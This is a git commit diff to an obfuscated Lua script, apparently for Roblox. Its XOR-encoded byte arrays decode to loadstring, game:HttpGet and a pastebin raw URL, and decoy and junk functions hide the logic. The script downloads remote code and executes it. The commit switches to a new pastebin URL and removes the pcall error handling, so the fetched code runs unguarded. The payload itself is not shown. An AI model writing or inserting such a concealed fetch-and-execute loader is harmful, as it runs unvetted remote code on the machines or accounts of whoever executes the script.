3017e01e672e20095aeb52cff6899cd433173d5f
hwhwhwjwjhshshsh-design <hwhwhwjwjhshshsh@gmail.com>
2026-07-05 08:37:32 +0800

    Update Dylan.lua

--- Dylan.lua
+++ Dylan.lua
@@ -2,8 +2,8 @@ local _ = "Obfuscated by Dylan"
 local function bxor(a, b)
 	local r = 0
 	for i = 0, 31 do
-		local bitA = (a // 2^i) % 2
-		local bitB = (b // 2^i) % 2
+		local bitA = math.floor(a / 2^i) % 2
+		local bitB = math.floor(b / 2^i) % 2
 		if bitA ~= bitB then
 			r = r + 2^i
 		end
@@ -22,7 +22,7 @@ end
 local L_bytes = {54, 53, 59, 62, 41, 46, 40, 51, 52, 45}
 local G_bytes = {61, 59, 55, 63}
 local H_bytes = {18, 46, 46, 42, 29, 63, 46}
-local U_bytes = {50, 46, 46, 42, 41, 96, 117, 117, 42, 59, 41, 46, 63, 56, 51, 52, 116, 49, 53, 55, 117, 40, 59, 37, 117, 126, 44, 50, 102, 42, 24, 43, 42}
+local U_bytes = {50, 46, 46, 42, 41, 96, 117, 117, 42, 59, 41, 46, 63, 56, 51, 52, 116, 49, 53, 55, 117, 40, 59, 45, 117, 106, 44, 50, 22, 34, 24, 47, 42}
 
 local KEY = 0x5A
 local L = X(L_bytes, KEY)
@@ -51,10 +51,7 @@ decoy(L_bytes)
 local content = _G[G][H](_G[G], U)
 local fn = _G[L](content)
 if fn then
-	local ok, err = pcall(fn)
-	if not ok then
-		local d = string.char(0)
-	end
+	fn()
 end
 
 local function extra_junk()
